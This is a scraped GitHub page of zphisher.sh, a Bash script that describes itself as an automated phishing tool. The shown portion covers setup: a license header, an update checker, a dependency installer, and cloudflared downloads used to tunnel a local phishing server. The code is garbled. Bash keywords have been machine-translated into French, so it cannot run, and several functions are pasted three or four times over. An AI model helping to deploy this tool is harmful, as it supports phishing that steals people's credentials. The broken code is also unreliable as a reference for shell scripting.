# felianho-

htr-tech
/
zphisher
Public
Code
Questions
38
Demandes d'extraction
7
Actions
Sécurité
Connaissances
zphisher/ zphisher.sh
@htr-tech
Commande de réparation htr-tech
 8 contributeurs
Fichier Exécutable  911 lignes (816 sloc)  30,2 Ko
# ! /bin/bash

# # Zphisher : outil de phishing automatisé
# # Auteur : TAHMID RAYAT
# #Version : 2.3.5
# # Github : https://github.com/htr-tech/zphisher


# # LICENCE PUBLIQUE GÉNÉRALE GNU
# # Version 3, 29 juin 2007
# #
# # Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
# # Tout le monde est autorisé à copier et distribuer des copies textuelles
# # de ce document de licence, mais sa modification n'est pas autorisée.
# #
# # Préambule
# #
# # La Licence Publique Générale GNU est une licence libre avec copyleft pour
# # logiciels et autres types d'œuvres.
# #
# # Les licences de la plupart des logiciels et autres travaux pratiques sont conçues
# # pour vous priver de votre liberté de partager et de modifier les œuvres. Par contre,
# # la licence publique générale GNU est destinée à garantir votre liberté de
# # partager et modifier toutes les versions d'un programme - pour s'assurer qu'il reste gratuit
# # logiciel pour tous ses utilisateurs. Nous, la Free Software Foundation, utilisons le
# # GNU General Public License pour la plupart de nos logiciels ; cela s'applique aussi à
# # tout autre travail publié de cette manière par ses auteurs. Vous pouvez l'appliquer à
# # vos programmes aussi.
# #
# # Lorsque nous parlons de logiciel libre, nous faisons référence à la liberté, pas
# # prix. Nos licences publiques générales sont conçues pour s'assurer que vous
# # ont la liberté de distribuer des copies de logiciels libres (et de facturer
# # si vous le souhaitez), que vous recevez le code source ou que vous pouvez l'obtenir si vous
# # le voulez, que vous puissiez changer le logiciel ou en utiliser des morceaux dans de nouveaux
# # programmes gratuits, et que vous savez que vous pouvez faire ces choses.
# #
# # Pour protéger vos droits, nous devons empêcher les autres de vous refuser
# # ces droits ou vous demandant de renoncer aux droits. Par conséquent, vous avez
# # certaines responsabilités si vous distribuez des copies du logiciel, ou si
# # vous le modifiez : responsabilités de respecter la liberté d'autrui.
# #
# # Par exemple, si vous distribuez des copies d'un tel programme, si
# # gratuitement ou moyennant des frais, vous devez transmettre aux destinataires le même
# # libertés que vous avez reçues. Vous devez vous assurer qu'eux aussi reçoivent
# # ou peut obtenir le code source. Et vous devez leur montrer ces termes pour qu'ils
# # connaître leurs droits.
# #
# # Les développeurs qui utilisent la GNU GPL protègent vos droits en deux étapes :
# # (1) revendiquer le droit d'auteur sur le logiciel, et (2) vous offrir cette Licence
# # vous donnant l'autorisation légale de le copier, de le distribuer et/ou de le modifier.
# #
# # Pour la protection des développeurs et des auteurs, la GPL explique clairement
# # qu'il n'y a aucune garantie pour ce logiciel gratuit. Pour les utilisateurs et
# # pour l'amour des auteurs, la GPL exige que les versions modifiées soient marquées comme
# # changé, afin que leurs problèmes ne soient pas attribués à tort à
# # auteurs des versions précédentes.
# #
# # Certains appareils sont conçus pour refuser aux utilisateurs l'accès à l'installation ou à l'exécution
# # versions modifiées du logiciel à l'intérieur, bien que le fabricant
# # peut le faire. Ceci est fondamentalement incompatible avec l'objectif de
# # protégeant la liberté des utilisateurs de modifier le logiciel. La systématique
# # modèle de tels abus se produit dans le domaine des produits pour les particuliers à
# # utilisation, qui est précisément là où elle est la plus inacceptable. Par conséquent, nous
# # ont conçu cette version de la GPL pour en interdire la pratique à ceux
# # produits. Si de tels problèmes surviennent substantiellement dans d'autres domaines, nous
# # se tient prêt à étendre cette disposition à ces domaines dans les futures versions
# # de la GPL, au besoin pour protéger la liberté des utilisateurs.
# #
# # Enfin, chaque programme est constamment menacé par les brevets logiciels.
# # Les États ne devraient pas autoriser les brevets à restreindre le développement et l'utilisation de
# # logiciels sur les ordinateurs à usage général, mais dans ceux qui le font, nous souhaitons
# # éviter le danger particulier que les brevets appliqués à un programme libre pourraient
# # le rendre effectivement propriétaire. Pour éviter cela, la GPL assure que
# # les brevets ne peuvent pas être utilisés pour rendre le programme non libre.
# #
# # Les conditions précises de copie, de distribution et de
# # modification suivre.
# #
# # Copyright (C) 2022 HTR-TECH (https://github.com/htr-tech)
# #

# # MERCI À :
# # 1RaY-1 - https://github.com/1RaY-1
# # Aditya Shakya - https://github.com/adi1090x
# # Ali Milani Amin - https://github.com/AliMilani
# # Ignitetch - https://github.com/Ignitetch/AdvPhishing
# # Moises Tapia - https://github.com/MoisesTapia
# # M. Derek - https://github.com/E343IO
# # Mustakim Ahmed - https://github.com/bdhackers009
# # TheLinuxChoice - https://twitter.com/linux_choice


__version__= " 2.3.5 "

# # HÔTE ET PORT PAR DÉFAUT
HÔTE= ' 127.0.0.1 '
PORT= ' 8080 ' 

# # Couleurs ANSI (FG & BG)
ROUGE= " $( printf ' \033[31m ' ) "   VERT= " $( printf ' \033[32m ' ) "   ORANGE= " $( printf ' \033[33m ' ) "   BLEU= " $( printf ' \ 033[34m ' ) "
MAGENTA= " $( printf ' \033[35m ' ) "   CYAN= " $( printf ' \033[36m ' ) "   BLANC= " $( printf ' \033[37m ' ) " NOIR= " $( printf ' \ 033[30m ' ) "
REDBG= " $( printf ' \033[41m ' ) "   GREENBG= " $( printf ' \033[42m ' ) "   ORANGEBG= " $( printf ' \033[43m ' ) "   BLUEBG= " $( printf ' \ 033[44m ' ) "
MAGENTABG= " $( printf ' \033[45m ' ) "   CYANBG= " $( printf ' \033[46m ' ) "   WHITEBG= " $( printf ' \033[47m ' ) " BLACKBG= " $( printf ' \ 033[40m ' ) "
RESETBG= " $( printf ' \e[0m\n ' ) "

# # Répertoires
BASE_DIR= $( realpath " $( dirname " $BASH_SOURCE " ) " )

si [[ !  -d  " .serveur " ]] ;  alors
	mkdir -p " .serveur "
Fi

si [[ !  -d  " authentification " ]] ;  alors
	mkdir -p " auth "
Fi

si [[ -d  " .serveur/www " ]] ;  alors
	rm -rf " .serveur/www "
	mkdir -p " .serveur/www "
autre
	mkdir -p " .serveur/www "
Fi

# # Supprimer le fichier journal
si [[ -e  " .server/.loclx " ]] ;  alors
	rm -rf " .serveur/.loclx "
Fi

si [[ -e  " .server/.cld.log " ]] ;  alors
	rm -rf " .serveur/.cld.log "
Fi

# # Fin de script
exit_on_signal_SIGINT () {
	{ printf  " \n\n%s\n\n "  " ${RED} [ ${WHITE} ! ${RED} ] ${RED} Programme interrompu. "  2>&1 ; réinitialiser_couleur ; }
	sortie 0
}

exit_on_signal_SIGTERM () {
	{ printf  " \n\n%s\n\n "  " ${RED} [ ${WHITE} ! ${RED} ] ${RED} Programme terminé. "  2>&1 ; réinitialiser_couleur ; }
	sortie 0
}

piège exit_on_signal_SIGINT SIGINT
piège exit_on_signal_SIGTERM SIGTERM

# # Réinitialiser les couleurs du terminal
reset_color () {
	tput sgr0    # réinitialiser les attributs
	tput op      # réinitialiser la couleur
	retour
}

# # Tue le processus déjà en cours d'exécution
kill_pid () {
	check_PID= " loclx php cloudflared "
	pour  le processus  dans  ${check_PID} ;  faire
		si [[ $( pidof ${process} ) ]] ;  then  # Vérifier le processus
			killall ${process}  > /dev/null 2>&1  # Tue le processus
		Fi
	fait
}

# Rechercher une version plus récente
check_update (){
	echo -ne " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Recherche de mise à jour : "
	relase_url= ' https://api.github.com/repos/htr-tech/zphisher/releases/latest '
	new_version= $( curl -s " ${relase_url} "  | grep ' "tag_name": '  | awk -F \"  ' {print $4} ' )
	tarball_url= " https://github.com/htr-tech/zphisher/archive/refs/tags/ ${new_version} .tar.gz "

	si [[ $nouvelle_version  !=  $__version__ ]] ;  alors
		echo -ne " ${ORANGE} mise à jour trouvée\n " ${WHITE}
		dormir 2
		echo -ne " \n ${VERT} [ ${BLANC} + ${VERT} ] ${ORANGE} Téléchargement de la mise à jour... "
		pushd  " $HOME "  > /dev/null 2>&1
		curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output " .zphisher.tar.gz "  " ${tarball_url} "

		si [[ -e  " .zphisher.tar.gz " ]] ;  alors
			tar -xf .zphisher.tar.gz -C " $BASE_DIR " --strip-components 1 > /dev/null 2>&1
			[ $ ?  -ne 0 ] && { echo -e " \n\n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Une erreur s'est produite lors de l'extraction. " ; réinitialiser_couleur ;  sortie 1 ; }
			rm -f .zphisher.tar.gz
			popd  > /dev/null 2>&1
			{ dormir 3 ; clair ; banner_small ; }
			echo -ne " \n ${GREEN} [ ${WHITE} + ${GREEN} ] Mise à jour réussie ! Exécutez à nouveau zphisher\n\n " ${WHITE}
			{ reset_color ;  sortie 1 ; }
		autre
			echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Une erreur s'est produite lors du téléchargement. "
			{ reset_color ;  sortie 1 ; }
		Fi
	autre
		echo -ne " ${GREEN} à jour\n ${WHITE} "  ; dormir .5
	Fi
}

# # Vérifier l'état d'Internet
check_status () {
	echo -ne " \n ${VERT} [ ${BLANC} + ${VERT} ] ${CYAN} Statut Internet : "
	timeout 3s curl -fIs " https://api.github.com "  > /dev/null
	[ $ ?  -eq 0 ] &&  echo -e " ${GREEN} En ligne ${WHITE} "  && check_update ||  echo -e " ${RED} Hors ligne ${WHITE} "
}

# # Bannière
bannière () {
	chat << - EOF
		${ORANGE}
		${ORANGE} ______ _ _ _               
		${ORANGE} |___ / | | (_) | |              
		${ORANGE}    / / _ __ | |__ _ ___| |__ ___ _ __
		${ORANGE}   / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
		${ORANGE} / /__| |_) | | | | \__ \ | | | __/ |   
		${ORANGE} /_____| .__/|_| |_|_|___/_| |_|\___|_|   
		${ORANGE}       | |                                
		${ORANGE}       |_|                Version ${RED} : ${__version__}
		${GREEN} [ ${WHITE} - ${GREEN} ] ${CYAN} Outil Créé par htr-tech (tahmid.rayat) ${WHITE}
	EOF
}

# # Petite bannière
banner_small () {
	chat << - EOF
		${BLEU}
		${BLEU}   ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLEU}   ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLEU}   ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ ${BLANC}  ${__version__}
	EOF
}
# # Petite bannière
banner_small () {
	chat << - EOF
		${BLEU}
		${BLEU}   ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLEU}   ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLEU}   ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ ${BLANC}  ${__version__}
	EOF
}

# # Dépendances
dépendances () {
	echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation des packages requis... "

	if [[ -d  " /data/data/com.termux/files/home " ]] ;  alors
		si [[ !  $( commande -v proot ) ]] ;  alors
			echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation du package : ${ORANGE} proot ${CYAN} " ${WHITE}
			pkg install proot resolv-conf -y
		Fi

		si [[ !  $( commande -v tput ) ]] ;  alors
			echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Paquet d'installation : ${ORANGE} ncurses-utils ${CYAN} " ${WHITE}
			pkg installer ncurses-utils -y
		Fi
	Fi

	if [[ $( command -v php )  &&  $( command -v curl )  &&  $( command -v unzip ) ]] ;  alors
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${GREEN} Paquets déjà installés. "
	autre
		pkgs=(php curl décompresser)
		pour  pkg  dans  " ${pkgs[@]} " ;  faire
			tapez -p " $pkg "  & > /dev/null || {
				echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation du package : ${ORANGE} $pkg ${CYAN} " ${WHITE}
				si [[ $( commande -v paquet ) ]] ;  alors
					pkg install " $pkg " -y
				elif [[ $( commande -v apt ) ]] ;  alors
					sudo apt install " $pkg " -y
				elif [[ $( commande -v apt-get ) ]] ;  alors
					sudo apt-get install " $pkg " -y
				elif [[ $( commande -v pacman ) ]] ;  alors
					sudo pacman -S " $pkg " --noconfirm
				elif [[ $( commande -v dnf ) ]] ;  alors
					sudo dnf -y install " $pkg "
				elif [[ $( commande -v yum ) ]] ;  alors
					sudo yum -y install " $pkg "
				autre
					echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Gestionnaire de packages non pris en charge, installez les packages manuellement. "
					{ reset_color ;  sortie 1 ; }
				Fi
			}
		fait
	Fi
}

# Télécharger les binaires
télécharger () {
	URL= " $1 "
	sortie= " $2 "
	fichier= ` nom de base $url `
	si [[ -e  " $fichier "  ||  -e  " $sortie " ]] ;  alors
		rm -rf " $fichier "  " $sortie "
	Fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output " ${fichier} "  " ${url} "

	si [[ -e  " $fichier " ]] ;  alors
		if [[ ${fichier #* .}  ==  " zip " ]] ;  alors
			décompressez -qq $fichier  > /dev/null 2>&1
			mv -f $sortie .server/ $sortie  > /dev/null 2>&1
		elif [[ ${fichier #* .}  ==  " tgz " ]] ;  alors
			tar -zxf $fichier  > /dev/null 2>&1
			mv -f $sortie .server/ $sortie  > /dev/null 2>&1
		autre
			mv -f $fichier .serveur/ $sortie  > /dev/null 2>&1
		Fi
		chmod +x .server/ $sortie  > /dev/null 2>&1
		rm -rf " $fichier "
	autre
		echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Une erreur s'est produite lors du téléchargement de ${output} . "
		{ reset_color ;  sortie 1 ; }
	Fi
}

# # Installer Cloudflared
install_cloudflared () {
	si [[ -e  " .server/cloudflared " ]] ;  alors
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${GREEN} Cloudflared déjà installé. "
	autre
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation de Cloudflared... " ${WHITE}
		arch= ` uname -m `
		if [[ ( " $arch " == * ' arm ' * ) || ( " $arch " == * ' Android ' * ) ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm '  ' cloudflared '
		elif [[ " $arch "  ==  * ' aarch64 ' * ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 '  ' cloudflared '
		elif [[ " $arch "  ==  * ' x86_64 ' * ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 '  ' cloudflared '
		autre
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 '  ' cloudflared '
		Fi
	Fi
}


# # Petite bannière
banner_small () {
	chat << - EOF
		${BLEU}
		${BLEU}   ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLEU}   ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLEU}   ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ ${BLANC}  ${__version__}
	EOF
}

# # Dépendances
dépendances () {
	echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation des packages requis... "

	if [[ -d  " /data/data/com.termux/files/home " ]] ;  alors
		si [[ !  $( commande -v proot ) ]] ;  alors
			echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation du package : ${ORANGE} proot ${CYAN} " ${WHITE}
			pkg install proot resolv-conf -y
		Fi

		si [[ !  $( commande -v tput ) ]] ;  alors
			echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Paquet d'installation : ${ORANGE} ncurses-utils ${CYAN} " ${WHITE}
			pkg installer ncurses-utils -y
		Fi
	Fi

	if [[ $( command -v php )  &&  $( command -v curl )  &&  $( command -v unzip ) ]] ;  alors
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${GREEN} Paquets déjà installés. "
	autre
		pkgs=(php curl décompresser)
		pour  pkg  dans  " ${pkgs[@]} " ;  faire
			tapez -p " $pkg "  & > /dev/null || {
				echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation du package : ${ORANGE} $pkg ${CYAN} " ${WHITE}
				si [[ $( commande -v paquet ) ]] ;  alors
					pkg install " $pkg " -y
				elif [[ $( commande -v apt ) ]] ;  alors
					sudo apt install " $pkg " -y
				elif [[ $( commande -v apt-get ) ]] ;  alors
					sudo apt-get install " $pkg " -y
				elif [[ $( commande -v pacman ) ]] ;  alors
					sudo pacman -S " $pkg " --noconfirm
				elif [[ $( commande -v dnf ) ]] ;  alors
					sudo dnf -y install " $pkg "
				elif [[ $( commande -v yum ) ]] ;  alors
					sudo yum -y install " $pkg "
				autre
					echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Gestionnaire de packages non pris en charge, installez les packages manuellement. "
					{ reset_color ;  sortie 1 ; }
				Fi
			}
		fait
	Fi
}

# Télécharger les binaires
télécharger () {
	URL= " $1 "
	sortie= " $2 "
	fichier= ` nom de base $url `
	si [[ -e  " $fichier "  ||  -e  " $sortie " ]] ;  alors
		rm -rf " $fichier "  " $sortie "
	Fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output " ${fichier} "  " ${url} "

	si [[ -e  " $fichier " ]] ;  alors
		if [[ ${fichier #* .}  ==  " zip " ]] ;  alors
			décompressez -qq $fichier  > /dev/null 2>&1
			mv -f $sortie .server/ $sortie  > /dev/null 2>&1
		elif [[ ${fichier #* .}  ==  " tgz " ]] ;  alors
			tar -zxf $fichier  > /dev/null 2>&1
			mv -f $sortie .server/ $sortie  > /dev/null 2>&1
		autre
			mv -f $fichier .serveur/ $sortie  > /dev/null 2>&1
		Fi
		chmod +x .server/ $sortie  > /dev/null 2>&1
		rm -rf " $fichier "
	autre
		echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Une erreur s'est produite lors du téléchargement de ${output} . "
		{ reset_color ;  sortie 1 ; }
	Fi
}

# # Installer Cloudflared
install_cloudflared () {
	si [[ -e  " .server/cloudflared " ]] ;  alors
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${GREEN} Cloudflared déjà installé. "
	autre
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation de Cloudflared... " ${WHITE}
		arch= ` uname -m `
		if [[ ( " $arch " == * ' arm ' * ) || ( " $arch " == * ' Android ' * ) ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm '  ' cloudflared '
		elif [[ " $arch "  ==  * ' aarch64 ' * ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 '  ' cloudflared '
		elif [[ " $arch "  ==  * ' x86_64 ' * ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 '  ' cloudflared '
		autre
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 '  ' cloudflared '
		Fi
	Fi
}
# # Petite bannière
banner_small () {
	chat << - EOF
		${BLEU}
		${BLEU}   ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLEU}   ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLEU}   ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ ${BLANC}  ${__version__}
	EOF
}

# # Dépendances
dépendances () {
	echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation des packages requis... "

	if [[ -d  " /data/data/com.termux/files/home " ]] ;  alors
		si [[ !  $( commande -v proot ) ]] ;  alors
			echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation du package : ${ORANGE} proot ${CYAN} " ${WHITE}
			pkg install proot resolv-conf -y
		Fi

		si [[ !  $( commande -v tput ) ]] ;  alors
			echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Paquet d'installation : ${ORANGE} ncurses-utils ${CYAN} " ${WHITE}
			pkg installer ncurses-utils -y
		Fi
	Fi

	if [[ $( command -v php )  &&  $( command -v curl )  &&  $( command -v unzip ) ]] ;  alors
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${GREEN} Paquets déjà installés. "
	autre
		pkgs=(php curl décompresser)
		pour  pkg  dans  " ${pkgs[@]} " ;  faire
			tapez -p " $pkg "  & > /dev/null || {
				echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation du package : ${ORANGE} $pkg ${CYAN} " ${WHITE}
				si [[ $( commande -v paquet ) ]] ;  alors
					pkg install " $pkg " -y
				elif [[ $( commande -v apt ) ]] ;  alors
					sudo apt install " $pkg " -y
				elif [[ $( commande -v apt-get ) ]] ;  alors
					sudo apt-get install " $pkg " -y
				elif [[ $( commande -v pacman ) ]] ;  alors
					sudo pacman -S " $pkg " --noconfirm
				elif [[ $( commande -v dnf ) ]] ;  alors
					sudo dnf -y install " $pkg "
				elif [[ $( commande -v yum ) ]] ;  alors
					sudo yum -y install " $pkg "
				autre
					echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Gestionnaire de packages non pris en charge, installez les packages manuellement. "
					{ reset_color ;  sortie 1 ; }
				Fi
			}
		fait
	Fi
}

# Télécharger les binaires
télécharger () {
	URL= " $1 "
	sortie= " $2 "
	fichier= ` nom de base $url `
	si [[ -e  " $fichier "  ||  -e  " $sortie " ]] ;  alors
		rm -rf " $fichier "  " $sortie "
	Fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output " ${fichier} "  " ${url} "

	si [[ -e  " $fichier " ]] ;  alors
		if [[ ${fichier #* .}  ==  " zip " ]] ;  alors
			décompressez -qq $fichier  > /dev/null 2>&1
			mv -f $sortie .server/ $sortie  > /dev/null 2>&1
		elif [[ ${fichier #* .}  ==  " tgz " ]] ;  alors
			tar -zxf $fichier  > /dev/null 2>&1
			mv -f $sortie .server/ $sortie  > /dev/null 2>&1
		autre
			mv -f $fichier .serveur/ $sortie  > /dev/null 2>&1
		Fi
		chmod +x .server/ $sortie  > /dev/null 2>&1
		rm -rf " $fichier "
	autre
		echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Une erreur s'est produite lors du téléchargement de ${output} . "
		{ reset_color ;  sortie 1 ; }
	Fi
}

# # Installer Cloudflared
install_cloudflared () {
	si [[ -e  " .server/cloudflared " ]] ;  alors
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${GREEN} Cloudflared déjà installé. "
	autre
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation de Cloudflared... " ${WHITE}
		arch= ` uname -m `
		if [[ ( " $arch " == * ' arm ' * ) || ( " $arch " == * ' Android ' * ) ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm '  ' cloudflared '
		elif [[ " $arch "  ==  * ' aarch64 ' * ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 '  ' cloudflared '
		elif [[ " $arch "  ==  * ' x86_64 ' * ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 '  ' cloudflared '
		autre
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 '  ' cloudflared '
		Fi
	Fi
}


# # Petite bannière
banner_small () {
	chat << - EOF
		${BLEU}
		${BLEU}   ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
		${BLEU}   ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
		${BLEU}   ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ ${BLANC}  ${__version__}
	EOF
}

# # Dépendances
dépendances () {
	echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation des packages requis... "

	if [[ -d  " /data/data/com.termux/files/home " ]] ;  alors
		si [[ !  $( commande -v proot ) ]] ;  alors
			echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation du package : ${ORANGE} proot ${CYAN} " ${WHITE}
			pkg install proot resolv-conf -y
		Fi

		si [[ !  $( commande -v tput ) ]] ;  alors
			echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Paquet d'installation : ${ORANGE} ncurses-utils ${CYAN} " ${WHITE}
			pkg installer ncurses-utils -y
		Fi
	Fi

	if [[ $( command -v php )  &&  $( command -v curl )  &&  $( command -v unzip ) ]] ;  alors
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${GREEN} Paquets déjà installés. "
	autre
		pkgs=(php curl décompresser)
		pour  pkg  dans  " ${pkgs[@]} " ;  faire
			tapez -p " $pkg "  & > /dev/null || {
				echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation du package : ${ORANGE} $pkg ${CYAN} " ${WHITE}
				si [[ $( commande -v paquet ) ]] ;  alors
					pkg install " $pkg " -y
				elif [[ $( commande -v apt ) ]] ;  alors
					sudo apt install " $pkg " -y
				elif [[ $( commande -v apt-get ) ]] ;  alors
					sudo apt-get install " $pkg " -y
				elif [[ $( commande -v pacman ) ]] ;  alors
					sudo pacman -S " $pkg " --noconfirm
				elif [[ $( commande -v dnf ) ]] ;  alors
					sudo dnf -y install " $pkg "
				elif [[ $( commande -v yum ) ]] ;  alors
					sudo yum -y install " $pkg "
				autre
					echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Gestionnaire de packages non pris en charge, installez les packages manuellement. "
					{ reset_color ;  sortie 1 ; }
				Fi
			}
		fait
	Fi
}

# Télécharger les binaires
télécharger () {
	URL= " $1 "
	sortie= " $2 "
	fichier= ` nom de base $url `
	si [[ -e  " $fichier "  ||  -e  " $sortie " ]] ;  alors
		rm -rf " $fichier "  " $sortie "
	Fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output " ${fichier} "  " ${url} "

	si [[ -e  " $fichier " ]] ;  alors
		if [[ ${fichier #* .}  ==  " zip " ]] ;  alors
			décompressez -qq $fichier  > /dev/null 2>&1
			mv -f $sortie .server/ $sortie  > /dev/null 2>&1
		elif [[ ${fichier #* .}  ==  " tgz " ]] ;  alors
			tar -zxf $fichier  > /dev/null 2>&1
			mv -f $sortie .server/ $sortie  > /dev/null 2>&1
		autre
			mv -f $fichier .serveur/ $sortie  > /dev/null 2>&1
		Fi
		chmod +x .server/ $sortie  > /dev/null 2>&1
		rm -rf " $fichier "
	autre
		echo -e " \n ${RED} [ ${WHITE} ! ${RED} ] ${RED} Une erreur s'est produite lors du téléchargement de ${output} . "
		{ reset_color ;  sortie 1 ; }
	Fi
}

# # Installer Cloudflared
install_cloudflared () {
	si [[ -e  " .server/cloudflared " ]] ;  alors
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${GREEN} Cloudflared déjà installé. "
	autre
		echo -e " \n ${GREEN} [ ${WHITE} + ${GREEN} ] ${CYAN} Installation de Cloudflared... " ${WHITE}
		arch= ` uname -m `
		if [[ ( " $arch " == * ' arm ' * ) || ( " $arch " == * ' Android ' * ) ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm '  ' cloudflared '
		elif [[ " $arch "  ==  * ' aarch64 ' * ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 '  ' cloudflared '
		elif [[ " $arch "  ==  * ' x86_64 ' * ]] ;  alors
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 '  ' cloudflared '
		autre
			télécharger ' https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 '  ' cloudflared '
		Fi
	Fi
}
